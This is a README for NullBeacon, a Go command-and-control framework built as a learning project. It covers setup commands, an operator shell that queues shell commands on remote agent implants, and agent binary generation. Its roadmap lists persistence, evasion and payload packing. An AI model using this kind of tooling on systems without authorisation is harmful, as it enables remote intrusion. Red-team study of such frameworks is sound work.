# 🕸️ NullBeacon

A Command & Control (C2) framework built from scratch in Go, developed as a learning project to explore Go concurrency, networking, and security research concepts.

> ⚠️ **For authorized security research, CTF, and home lab use only. Never deploy against systems you do not own or have explicit written permission to test.**

---

## 🏗️ Architecture

```
Operator CLI
     │
     ▼
Teamserver ──► ListenerManager
     │              ├── TCP Listener :8080 ◄─── Agent(s)
     │              └── HTTP Listener :8081 (upcoming)
     │
     └── teamserver.log
```

| Component | Description |
|---|---|
| `teamserver` | Core server — manages listeners, agents, tasks |
| `listener` | Dynamic protocol listeners (TCP, HTTP, etc.) |
| `agent` | Beacons to a listener every 10 seconds |
| `operator shell` | readline-powered CLI with colors and history |

---

## 📁 Project Structure

```
go-c2/
├── cmd/
│   ├── teamserver/
│   │   ├── main.go         # Entry point, banner, operator shell
│   │   ├── handlers.go     # Agent connection handling
│   │   ├── listeners.go    # Listener start/stop/list
│   │   ├── agents.go       # Agent list and interact shell
│   │   ├── generate.go     # Agent binary generation
│   │   └── help.go         # Help menu
│   └── agent/              # Agent/implant binary
├── pkg/
│   ├── agent/              # Agent struct and registration logic
│   ├── listener/           # Dynamic listener management
│   ├── task/               # Task struct and queue logic
│   └── transport/          # (upcoming) HTTP/TLS transport
├── go.mod
├── go.sum
└── teamserver.log          # Runtime log (gitignored)
```

---

## ⚙️ Installation

**Requirements:** Go 1.21+

```bash
git clone https://github.com/RodKast/go-c2.git
cd go-c2
go mod tidy
```

---

## 🚀 Usage

**Start the teamserver:**
```bash
go run ./cmd/teamserver
```

Logs are written to `teamserver.log`. Monitor them in a separate terminal:
```bash
tail -f teamserver.log
```

**Start the agent** (defaults to `localhost:8080`):
```bash
go run ./cmd/agent
```

**Start the agent with a custom server address:**
```bash
go run ./cmd/agent -addr 192.168.1.10:8080
```

**Build binaries:**
```bash
go build ./cmd/teamserver
go build ./cmd/agent
```

---

## 🖥️ Operator Shell

Once the teamserver is running, the operator shell starts automatically.

| Command | Description |
|---|---|
| `listen tcp --lhost 0.0.0.0 --lport 8080` | Start a TCP listener |
| `listeners` | List all active listeners |
| `stop <listenerID>` | Stop a listener |
| `list` | List all connected agents |
| `interact <agentID>` | Enter the agent shell |
| `generate --os linux --arch amd64 --lhost <ip> --lport <port>` | Generate an agent binary |
| `help` | Show the help menu |
| `exit` | Exit the operator shell |

**Inside the agent shell:**

| Command | Description |
|---|---|
| `<any command>` | Queue a task, wait for output automatically |
| `tasks` | List all tasks and their output |
| `back` | Return to the main shell |

**Example session:**
```
nullbeacon> listen tcp --lhost 0.0.0.0 --lport 8080
started listener ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c on 0.0.0.0:8080

nullbeacon> listeners
Active listeners:
ID: ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c, Protocol: tcp, Host: 0.0.0.0, Port: 8080, Status: running

nullbeacon> list
Connected agents:
ID: dev-agent-001, Username: chris, Hostname: target, Address: 192.168.1.5:51234

nullbeacon> interact dev-agent-001
[agent:dev-agen]> whoami
[*] task queued: b90b40e6-05a1-4ebb-adee-6f5d4881109c (waiting for output...)
output: chris
[agent:dev-agen]> tasks
[b90b40e6] whoami → completed: chris
[agent:dev-agen]> back

nullbeacon> stop ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c
stopped listener ebfe99d4-413f-4cad-a71e-7c1d6e4e7a9c

nullbeacon> exit
```

---

## ✅ Features

- [x] TCP listener with concurrent agent handling
- [x] Read timeout protection against hung connections
- [x] Agent check-in with hostname and username
- [x] UUID-based agent registration
- [x] Mutex-protected agent map for concurrent access
- [x] Configurable server address via CLI flag (`-addr`)
- [x] Agent beacon loop (every 10 seconds)
- [x] Interactive operator shell
- [x] Agent listing with full system info
- [x] Task queuing per agent
- [x] Log redirection to file (clean operator terminal)
- [x] Persistent agent ID baked in at build time via `ldflags`
- [x] Returning beacon detection (no duplicate registration)
- [x] Task delivery on beacon
- [x] Shell command execution on agent side (`os/exec`)
- [x] Task output returned automatically to operator
- [x] Real-time output polling in operator shell
- [x] NullBeacon ASCII banner with colored output (`fatih/color`)
- [x] readline-powered prompt with command history (`chzyer/readline`)
- [x] Dynamic listener management (start/stop/list)
- [x] Context-based listener cancellation (`context.WithCancel`)
- [x] Multi-protocol listener architecture (TCP now, HTTP/TLS upcoming)
- [x] Agent binary generation with cross-compilation (`GOOS`/`GOARCH`)
- [x] Random hacking-themed agent filenames (e.g. `GHOST_COBRA.elf`)
- [x] Agent saves to operator's current working directory
- [x] Colored help menu with full command reference
- [x] Teamserver split into focused files (handlers, listeners, agents, generate, help)

---

## 🗺️ Roadmap

- [x] Stage 1 — TCP teamserver skeleton
- [x] Stage 2 — Agent check-in with system info
- [x] Stage 3 — Beacon loop
- [x] Stage 4 — Agent registration with UUID and mutex-protected map
- [x] Stage 5 — Operator shell (list agents, queue tasks)
- [x] Stage 6 — Persistent agent ID + task delivery on beacon
- [x] Stage 7 — Command execution on agent side + output return
- [x] Stage 7.5 — NullBeacon CLI (readline, colors, banner)
- [x] Stage 7.6 — Dynamic listener management (start/stop/list)
- [x] Stage 7.7 — Agent generation with cross-compilation and themed names
- [x] Stage 7.8 — Help menu and teamserver refactor into focused files
- [ ] Stage 8 — Persistence (registry, cron, systemd)
- [ ] Stage 9 — Evasion (sleep jitter, AMSI/ETW stubs)
- [ ] Stage 10 — Packing (AES payload encryption, custom loaders)
- [ ] Stage 11 — Transport hardening (TLS, malleable profiles)

---

## ⚠️ Disclaimer

This project is built for **educational purposes**, **CTF competitions**, and **authorized security research**. The authors are not responsible for misuse.
